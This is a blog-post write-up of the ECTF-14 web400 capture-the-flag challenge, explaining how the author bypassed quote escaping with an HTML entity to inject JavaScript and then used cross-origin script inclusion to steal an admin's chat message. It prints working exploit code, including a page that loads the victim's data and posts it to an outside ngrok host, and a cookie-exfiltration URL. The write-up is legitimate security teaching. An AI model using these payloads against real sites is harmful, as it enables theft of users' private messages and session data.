---
layout: post
title: ECTF-14 Web400 Writeup
tags:
- ectf
- writeup
---

We recently participated in [ECTF-14](https://github.com/ctfs/write-ups-2014/tree/master/ectf-2014) and it was a great experience. Here's a writeup to the web400 challenge:

### Problem Statement

>The chat feature was added to Facelook website and to test it, founder of the company had sent a message in chat to the admin. Admin reads all the chat messages, but does not reply to anyone. Try to get that chat message and earn the bounty.
>[Annoying Admin]

The challenge consisted of a simple signup and a chat message sending feature, where anyone could send a chat message to anyone. However, on the loading side, the chat message was loaded using Javascript. The code for loading the messages looked like this:

```javascript
function load_messages (id) {
    $.ajax({
    url: "http://212.71.235.214:4050/chat",
    data: {
        sender: id,
    },
    success: function( response ) {
        eval(response);
    }
    });
}
```

The url above responded as the following:

```
$('#chat_234').html('');$('#chat_234').append('dream<br />');
```

Where `dream` was the message I sent. My first attempt was to break out of the append function, and execute my own javascript, by trivially using a single quote. Unfortunately, the single quote was escaped and removed by the backend.

Next, I tried using `&#x27;` instead of a single quote, and it worked:

Message Sent: `&#x27;+alert(1)+&#x27; `
Message received: `$('#chat_234').html('');$('#chat_234').append('dream<br />');$('#chat_234').append(''+alert(1)+'<br />');`

This seemed simple enough to exploit as XSS, so I quickly wrote up my exploit:

$.get('/chat?sender=2', function(data){
  $.post("http://my-server.com/ectf/index.php", {content: data});
});

This utilized the fact that we knew Founder's user id to be `2`. The code worked perfectly fine with my test accounts, but something weird happened when the challenge server (admin) ran it. I would get a `GET` request on the above mentioned url, instead of a POST. Also attempting to generate the URL using concat or + or any operator such as : `"http://my-server.com/index.php?data="+document.cookie` made a request to `http://my-server.com/index.php?data=`. Anything I appended was just ignored, plain and simple.


After attempting to get a POST request with cookie or session data for a lot of time, I realized that the problem was not XSS, but rather a CSRF attack. This was because the data was being loaded in a Javascript request, instead of JSON. Javascript request (using a script tag) can be made across domains, which meant that any website could access the data by using the proper script tag. We just had to add a script tag with its src set to `http://212.71.235.214:4050/chat?sender=2`. This would automatically add the chat message to a div with id `chat_2`.

The only issue was that Admin had to visit our site, with proper cookies, and we know already that admin has been sniffing for links and visiting them. So I wrote up my second (this time working) exploit:

```xml
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>ECTF14 web400 exploit</title>
</head>
<body>
  <div id="chat_2"></div>
  <div id="chat_106"></div>
  <script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>
  <script>
    $(document).ready(function(){
      $.getScript("http://212.71.235.214:4050/chat?sender=2");
      setTimeout(function(){
        var text = $('#chat_2').text();
        $.post('http://20c7d53b.ngrok.com/', {content:text});
      }, 1000);
    })
  </script>
</body>
</html>
```


Unfortunately, the exploit did not work on Chrome because Chrome refused to run the script as javascript, because it was being served with a mime-type of `text/html`. It worked in firefox, and I crossed my fingers as I sent out the link to the above page to admin in a chat message. I knew admin user was using PhantomJS to run my javascript (because of the user-agent in numerous GET requests I got earlier). So, I was hopeful that this would work.

I was listening at the url, and sure enough as soon as I sent a link out to this page, admin ran my javascript and I got the flag in a POST request.

The flag was `bad_js_is_vulnerable`.